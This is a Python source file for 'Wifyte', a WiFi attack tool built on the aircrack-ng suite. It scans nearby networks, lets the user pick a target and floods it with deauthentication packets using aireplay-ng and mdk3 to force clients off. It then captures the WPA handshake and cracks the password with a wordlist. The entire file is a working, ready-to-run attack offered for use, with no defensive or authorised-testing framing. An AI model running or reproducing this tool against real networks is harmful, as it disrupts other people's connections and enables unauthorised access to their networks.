#!/usr/bin/env python3
import os
import re
import time
import signal
import subprocess
import sys
from dataclasses import dataclass
from typing import List, Optional, Tuple
import shutil
from datetime import datetime
import tempfile
import threading


# Color for output
class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


@dataclass
class WiFiNetwork:
    id: int
    bssid: str
    channel: int
    power: int
    essid: str
    encryption: str

    def __str__(self) -> str:
        return f"{Colors.BOLD}[{self.id}]{Colors.ENDC} {Colors.GREEN}{self.essid}{Colors.ENDC} ({self.bssid}) - CH:{self.channel} PWR:{self.power} {Colors.YELLOW}{self.encryption}{Colors.ENDC}"


class Wifyte:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.temp_dir = tempfile.mkdtemp()
        self.handshake_dir = os.path.join(os.getcwd(), "handshakes")
        self.stop_capture = False
        self.handshake_found = False

        # Create a handshakes directory if it does not already exist
        if not os.path.exists(self.handshake_dir):
            os.makedirs(self.handshake_dir)

        self.wordlist_path = os.path.join(os.getcwd(), "wifyte.txt")

        # Check if the wordlist exists
        if not os.path.exists(self.wordlist_path):
            print(
                f"{Colors.YELLOW}[!] Wordlist not found in {self.wordlist_path}{Colors.ENDC}"
            )
            print(f"{Colors.YELLOW}[!] Create a default wordlist...{Colors.ENDC}")
            with open(self.wordlist_path, "w") as f:
                f.write("password\n12345678\nqwerty123\nadmin123\nwifi12345\n")
            print(f"{Colors.GREEN}[+] Default wordlist created.{Colors.ENDC}")

    def cleanup(self):
        """Clearing temporary files"""
        try:
            shutil.rmtree(self.temp_dir)
        except Exception as e:
            print(f"{Colors.RED}[!] Error clearing temp directory: {e}{Colors.ENDC}")

    def __del__(self):
        self.cleanup()

    def execute_command(
        self, command, shell=False, capture_output=True, text=True
    ) -> subprocess.CompletedProcess:
        """Running shell commands with error handling"""
        try:
            result = subprocess.run(
                command, shell=shell, capture_output=capture_output, text=text
            )
            return result
        except Exception as e:
            print(f"{Colors.RED}[!] Error when executing command: {e}{Colors.ENDC}")
            print(f"{Colors.RED}[!] Command: {command}{Colors.ENDC}")
            return None

    def find_wifi_interfaces(self) -> List[str]:
        """Find all available wifi interfaces"""
        result = self.execute_command(["iwconfig"], shell=True)
        if not result or result.returncode != 0:
            print(
                f"{Colors.RED}[!] Error: Failed to get wifi interface list{Colors.ENDC}"
            )
            sys.exit(1)

        interfaces = []
        for line in result.stdout.split("\n"):
            if "IEEE 802.11" in line:
                interface = line.split()[0]
                interfaces.append(interface)

        return interfaces

    def check_monitor_mode(self, interface) -> bool:
        """Check if the interface is in monitor mode"""
        result = self.execute_command(["iwconfig", interface])
        if not result or result.returncode != 0:
            return False

        return "Mode:Monitor" in result.stdout

    def enable_monitor_mode(self, interface) -> Optional[str]:
        """Enable monitor mode on the interface"""
        # Turn off processes that may be interfering
        self.execute_command(["airmon-ng", "check", "kill"])

        # Turn off the interface
        self.execute_command(["ifconfig", interface, "down"])

        # Change to mode monitor
        result = self.execute_command(["airmon-ng", "start", interface])
        if not result or result.returncode != 0:
            print(
                f"{Colors.RED}[!] Error: Failed to enable monitor mode on {interface}{Colors.ENDC}"
            )
            return None

        # Search for the name of the created monitor interface
        match = re.search(
            r"(Created monitor mode interface|monitor mode enabled on) (\w+)",
            result.stdout,
        )
        if match:
            monitor_interface = match.group(2)
        else:
            # Alternative way if the output format is different
            interfaces_after = self.find_wifi_interfaces()
            for iface in interfaces_after:
                if self.check_monitor_mode(iface):
                    monitor_interface = iface
                    break
            else:
                monitor_interface = f"{interface}mon"  # Default airmon-ng assumptions

        # Ensuring the interface is up
        self.execute_command(["ifconfig", monitor_interface, "up"])

        print(
            f"{Colors.GREEN}[+] Monitor mode is active on the interface {monitor_interface}{Colors.ENDC}"
        )
        return monitor_interface

    def disable_monitor_mode(self, monitor_interface) -> bool:
        """Disable monitor mode"""
        result = self.execute_command(["airmon-ng", "stop", monitor_interface])
        if not result or result.returncode != 0:
            print(f"{Colors.RED}[!] Error: Failed to disable monitor mode{Colors.ENDC}")
            return False

        # Restart NetworkManager to restore normal connection
        self.execute_command(
            ["service", "NetworkManager", "restart"], capture_output=False
        )

        print(
            f"{Colors.GREEN}[+] Monitor mode disabled and NetworkManager restarted{Colors.ENDC}"
        )
        return True

    def setup_interface(self):
        """Setting up a wifi interface for scanning"""
        print(f"{Colors.BLUE}[*] Searching for wifi interfaces...{Colors.ENDC}")
        interfaces = self.find_wifi_interfaces()

        if not interfaces:
            print(f"{Colors.RED}[!] Error: No wifi interface found{Colors.ENDC}")
            sys.exit(1)

        # Check if any interfaces are already in monitor mode
        for interface in interfaces:
            if self.check_monitor_mode(interface):
                print(
                    f"{Colors.GREEN}[+] Interface {interface} already in monitor mode{Colors.ENDC}"
                )
                self.monitor_interface = interface
                return

        # If none are in monitor mode, select the first interface
        self.interface = interfaces[0]
        print(f"{Colors.GREEN}[+] Using interface {self.interface}{Colors.ENDC}")

        # Enable monitor mode
        self.monitor_interface = self.enable_monitor_mode(self.interface)
        if not self.monitor_interface:
            print(f"{Colors.RED}[!] Error: Failed to enable monitor mode{Colors.ENDC}")
            sys.exit(1)

    def scan_networks(self) -> List[WiFiNetwork]:
        """Scanning available wifi networks"""
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: No monitor mode interface found{Colors.ENDC}"
            )
            return []

        print(f"{Colors.BLUE}[*] Starting WiFi network scan...{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop scanning{Colors.ENDC}")

        # File to save scan results
        output_file = os.path.join(self.temp_dir, "scan-01.csv")

        # Run airodump-ng for scanning
        proc = subprocess.Popen(
            [
                "airodump-ng",
                "-w",
                os.path.join(self.temp_dir, "scan"),
                "--output-format",
                "csv",
                self.monitor_interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        try:
            # Scan for 6 seconds (faster than before)
            for i in range(6):
                time.sleep(1)
                print(f"{Colors.BLUE}[*] Scanning... {i+1}/6{Colors.ENDC}", end="\r")
            print("\n")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Scanning stopped by user{Colors.ENDC}")
        finally:
            proc.send_signal(signal.SIGTERM)
            proc.wait()

        networks = []

        # Parse scan results from CSV file
        try:
            if os.path.exists(output_file):
                with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                    lines = f.readlines()

                # Skip header
                data_section = False
                network_id = 0

                for line in lines:
                    line = line.strip()
                    if line.startswith("BSSID"):
                        data_section = True
                        continue

                    if line.startswith("Station MAC"):
                        break

                    if data_section and line:
                        parts = [part.strip() for part in line.split(",")]
                        if len(parts) >= 14:
                            network_id += 1
                            bssid = parts[0]
                            power = (
                                int(parts[8].strip())
                                if parts[8].strip()
                                and parts[8].strip().lstrip("-").isdigit()
                                else 0
                            )
                            channel = (
                                int(parts[3].strip())
                                if parts[3].strip() and parts[3].strip().isdigit()
                                else 0
                            )
                            encryption = parts[5].strip() + " " + parts[6].strip()
                            essid = parts[13].strip().replace("\x00", "")

                            if essid:  # Only add networks with ESSID
                                networks.append(
                                    WiFiNetwork(
                                        id=network_id,
                                        bssid=bssid,
                                        channel=channel,
                                        power=power,
                                        essid=essid,
                                        encryption=encryption,
                                    )
                                )
            else:
                print(
                    f"{Colors.RED}[!] Error: Scan results file not found{Colors.ENDC}"
                )
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading scan results: {e}{Colors.ENDC}")

        return networks

    def deauth_clients(self, network: WiFiNetwork) -> bool:
        """Deauth all clients on the target network using a more effective method"""
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: No monitor mode interface found{Colors.ENDC}"
            )
            return False

        print(
            f"{Colors.BLUE}[*] Performing aggressive deauth on {network.essid} ({network.bssid})...{Colors.ENDC}"
        )

        # Method 1: Deauth broadcast (all client)
        deauth_cmd1 = [
            "aireplay-ng",
            "--deauth",
            "25",  # more deauth packets
            "-a",
            network.bssid,
            self.monitor_interface,
        ]

        # Run deauth in a separate thread to avoid blocking the program
        def run_deauth():
            self.execute_command(deauth_cmd1, capture_output=False)

        deauth_thread = threading.Thread(target=run_deauth)
        deauth_thread.daemon = True
        deauth_thread.start()

        # Give a short time to ensure deauth packets are sent
        time.sleep(1)

        print(f"{Colors.GREEN}[+] Deauth packets successfully sent{Colors.ENDC}")
        return True

    def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
        """Capture handshake from the target network using an enhanced method"""
        if not self.monitor_interface:
            print(
                f"{Colors.RED}[!] Error: No interfaces with monitor mode{Colors.ENDC}"
            )
            return None

        # File name for handshake
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
        capture_path = os.path.join(self.temp_dir, capture_name)

        print(
            f"{Colors.BLUE}[*] Starting handshake capture for {network.essid}...{Colors.ENDC}"
        )

        # Reset flag
        self.stop_capture = False
        self.handshake_found = False

        # Run airodump-ng for capture handshake
        capture_cmd = [
            "airodump-ng",
            "--bssid",
            network.bssid,
            "--channel",
            str(network.channel),
            "--write",
            capture_path,
            self.monitor_interface,
        ]

        capture_proc = subprocess.Popen(
            capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Start thread watcher for checking handshake
        watcher_thread = threading.Thread(
            target=self.handshake_watcher, args=(capture_path, network)
        )
        watcher_thread.daemon = True
        watcher_thread.start()

        # More aggressive deauth strategy
        max_attempts = 30  # More attempts
        attempt = 0

        try:
            while attempt < max_attempts and not self.handshake_found:
                attempt += 1
                print(
                    f"{Colors.BLUE}[*] Deauth attempt {attempt}/{max_attempts}...{Colors.ENDC}"
                )

                # Send deauth packets with different approaches in each attempt
                if attempt % 2 == 0:
                    # Approach 1: Deauth broadcast
                    subprocess.Popen(
                        [
                            "aireplay-ng",
                            "--deauth",
                            "25",
                            "-a",
                            network.bssid,
                            self.monitor_interface,
                        ],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                else:
                    # Approach 2: MDK3 deauth (if available)
                    mdk3_path = shutil.which("mdk3")
                    if mdk3_path:
                        subprocess.Popen(
                            ["mdk3", self.monitor_interface, "d", "-b", network.bssid],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                    else:
                        # Fallback approach: aireplay with more packets
                        subprocess.Popen(
                            [
                                "aireplay-ng",
                                "--deauth",
                                "25",
                                "-a",
                                network.bssid,
                                self.monitor_interface,
                            ],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )

                # Wait a moment between deauth attempts (shorter than before)
                for i in range(5):
                    if self.handshake_found:
                        break
                    time.sleep(1)

            # Final check if not detected by the watcher
            cap_file = f"{capture_path}-01.cap"
            if not self.handshake_found and os.path.exists(cap_file):
                self.handshake_found = self.check_for_handshake(cap_file)

            if not self.handshake_found:
                print(
                    f"{Colors.RED}[!] Failed to capture handshake after {max_attempts} attempts{Colors.ENDC}"
                )
                return None

            # Copy handshake to handshakes directory
            final_path = os.path.join(
                self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
            )
            shutil.copy(cap_file, final_path)
            print(f"{Colors.GREEN}[+] Handshake saved to {final_path}{Colors.ENDC}")

            return final_path

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Capture cancelled by user{Colors.ENDC}")
            return None
        finally:
            self.stop_capture = True
            capture_proc.send_signal(signal.SIGTERM)
            capture_proc.wait()

    def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
        """Thread to monitor the capture file and check for handshake"""
        cap_file = f"{capture_path}-01.cap"
        check_interval = 1  # Check every 1 second

        while not self.stop_capture:
            if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
                print(f"{Colors.GREEN}[+] Handshake detected!{Colors.ENDC}")
                self.handshake_found = True
                self.stop_capture = True
                break
            time.sleep(check_interval)

    def check_for_handshake(self, cap_file: str) -> bool:
        """Check the capture file for handshake"""
        if not os.path.exists(cap_file):
            return False

        # Method 1: Using aircrack-ng
        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
        if aircrack_result and "1 handshake" in aircrack_result.stdout:
            return True

        # Method 2: Using cowpatty (if available) - more accurate verification
        cowpatty_path = shutil.which("cowpatty")
        if cowpatty_path:
            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
            if (
                cowpatty_result
                and "Collected all necessary data to mount crack against WPA"
                in cowpatty_result.stdout
            ):
                return True

        # Method 3: Using pyrit (if available) - more accurate verification
        pyrit_path = shutil.which("pyrit")
        if pyrit_path:
            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
            if (
                pyrit_result
                and "handshake(s)" in pyrit_result.stdout
                and not "0 handshake(s)" in pyrit_result.stdout
            ):
                return True

        return False

    def verify_handshake(self, handshake_path: str) -> bool:
        """Verify if the handshake is valid using multiple methods"""
        if not os.path.exists(handshake_path):
            print(f"{Colors.RED}[!] Error: Handshake file not found{Colors.ENDC}")
            return False

        print(
            f"{Colors.BLUE}[*] Verifying handshake with multiple tools...{Colors.ENDC}"
        )

        # Method 1: Aircrack-ng
        aircrack_valid = False
        result = self.execute_command(["aircrack-ng", handshake_path])
        if result and "1 handshake" in result.stdout:
            aircrack_valid = True
            print(f"{Colors.GREEN}[+] Aircrack-ng: Handshake valid{Colors.ENDC}")

        # Method 2: Cowpatty (if available)
        cowpatty_valid = False
        cowpatty_path = shutil.which("cowpatty")
        if cowpatty_path:
            result = self.execute_command(["cowpatty", "-c", "-r", handshake_path])
            if (
                result
                and "Collected all necessary data to mount crack against WPA"
                in result.stdout
            ):
                cowpatty_valid = True
                print(f"{Colors.GREEN}[+] Cowpatty: Handshake valid{Colors.ENDC}")

        # Final validation
        is_valid = aircrack_valid or cowpatty_valid

        if is_valid:
            print(f"{Colors.GREEN}[+] Handshake verified and valid!{Colors.ENDC}")
        else:
            print(f"{Colors.RED}[!] Handshake is not valid or incomplete{Colors.ENDC}")

        return is_valid

    def crack_password(self, handshake_path: str) -> Optional[str]:
        """Perform password cracking with wordlist using optimal method"""
        if not os.path.exists(handshake_path):
            print(f"{Colors.RED}[!] Error: Handshake file not found{Colors.ENDC}")
            return None

        if not os.path.exists(self.wordlist_path):
            print(f"{Colors.RED}[!] Error: Wordlist not found{Colors.ENDC}")
            return None

        print(f"{Colors.BLUE}[*] Starting password cracking...{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Using wordlist: {self.wordlist_path}{Colors.ENDC}")

        # Extract ESSID from the file name
        essid = os.path.basename(handshake_path).split(".")[0].replace("_", " ")

        # Metode 1: Hashcat (jika tersedia - lebih cepat)
        hashcat_path = shutil.which("hashcat")
        if hashcat_path:
            # Konversi cap ke hccapx format (untuk hashcat)
            hccapx_file = os.path.join(self.temp_dir, "handshake.hccapx")
            self.execute_command(["cap2hccapx", handshake_path, hccapx_file])

            if os.path.exists(hccapx_file):
                print(
                    f"{Colors.BLUE}[*] Using aircrack-ng for cracking...{Colors.ENDC}"
                )
        result = self.execute_command(
            ["aircrack-ng", "-w", self.wordlist_path, handshake_path]
        )
        if not result:
            print(f"{Colors.RED}[!] Error saat cracking password{Colors.ENDC}")
            return None

        # Cek hasil cracking
        if "KEY FOUND!" in result.stdout:
            match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
            if match:
                password = match.group(1)
                print(
                    f"{Colors.GREEN}[+] Password ditemukan: {Colors.BOLD}{password}{Colors.ENDC}"
                )
                return password

        print(f"{Colors.RED}[!] Password tidak ditemukan dalam wordlist{Colors.ENDC}")
        return None

    def display_banner(self):
        banner = f"""
{Colors.BOLD}{Colors.BLUE}
██╗    ██╗██╗███████╗██╗   ██╗████████╗███████╗
██║    ██║██║██╔════╝╚██╗ ██╔╝╚══██╔══╝██╔════╝
██║ █╗ ██║██║█████╗   ╚████╔╝    ██║   █████╗  
██║███╗██║██║██╔══╝    ╚██╔╝     ██║   ██╔══╝  
╚███╔███╔╝██║██║        ██║      ██║   ███████╗
 ╚══╝╚══╝ ╚═╝╚═╝        ╚═╝      ╚═╝   ╚══════╝
{Colors.ENDC}
{Colors.YELLOW}         WiFi Handshake Capture & Cracking Tool{Colors.ENDC}
{Colors.GREEN}           -- Optimized Speed Version --{Colors.ENDC}
"""
        print(banner)

    def run(self):
        """Run Main Program"""
        self.display_banner()

        # Setup interface
        self.setup_interface()

        # Scan jaringan
        self.networks = self.scan_networks()

        if not self.networks:
            print(f"{Colors.RED}[!] No networks found.{Colors.ENDC}")
            self.exit_program()
            return

        # Tampilkan hasil scan
        print(
            f"\n{Colors.BLUE}===== {len(self.networks)} Networks found ====={Colors.ENDC}"
        )
        for network in self.networks:
            print(network)

        # Pilih target
        try:
            network_choice = int(
                input(
                    f"\n{Colors.YELLOW}[?] Select Target [1-{len(self.networks)}]: {Colors.ENDC}"
                )
            )
            if network_choice < 1 or network_choice > len(self.networks):
                print(f"{Colors.RED}[!] Invalid choice{Colors.ENDC}")
                self.exit_program()
                return
        except ValueError:
            print(f"{Colors.RED}[!] Invalid input{Colors.ENDC}")
            self.exit_program()
            return
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
            self.exit_program()
            return

        target_network = self.networks[network_choice - 1]
        print(
            f"\n{Colors.GREEN}[+] Selected target: {target_network.essid} ({target_network.bssid}){Colors.ENDC}"
        )

        # Capture handshake
        handshake_path = self.capture_handshake(target_network)
        if not handshake_path:
            print(f"{Colors.RED}[!] Failed capturing handshake!{Colors.ENDC}")
            self.exit_program()
            return

        # Verifikasi handshake
        if not self.verify_handshake(handshake_path):
            self.exit_program()
            return

        # Crack password
        self.crack_password(handshake_path)

        # Keluar program
        self.exit_program()

    def exit_program(self):
        """Exit program dengan pilihan untuk mematikan monitor mode"""
        try:
            disable_monitor = (
                input(
                    f"\n{Colors.YELLOW}[?] Disable monitor mode? (y/n): {Colors.ENDC}"
                ).lower()
                == "y"
            )

            if disable_monitor and self.monitor_interface:
                self.disable_monitor_mode(self.monitor_interface)
            else:
                print(
                    f"{Colors.GREEN}[+] Monitor mode remains active on {self.monitor_interface}{Colors.ENDC}"
                )

            print(f"{Colors.BLUE}[*] Program closed, thank you!{Colors.ENDC}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
            if self.monitor_interface:
                print(
                    f"{Colors.GREEN}[+] Monitor mode remains active on {self.monitor_interface}{Colors.ENDC}"
                )


if __name__ == "__main__":
    try:
        # Cek apakah dijalankan sebagai root
        if os.geteuid() != 0:
            print(
                f"{Colors.RED}[!] Error: This program requires root access. Please run with 'sudo'{Colors.ENDC}"
            )
            sys.exit(1)

        # Cek dependensi
        dependencies = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
        missing_deps = []

        for dep in dependencies:
            if shutil.which(dep) is None:
                missing_deps.append(dep)

        if missing_deps:
            print(
                f"{Colors.RED}[!] Error: Some dependencies are missing: {', '.join(missing_deps)}{Colors.ENDC}"
            )
            print(
                f"{Colors.YELLOW}[!] Please install the aircrack-ng suite first:{Colors.ENDC}"
            )
            print(f"{Colors.YELLOW}    sudo apt-get install aircrack-ng{Colors.ENDC}")
            sys.exit(1)

        wifyte = Wifyte()
        wifyte.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
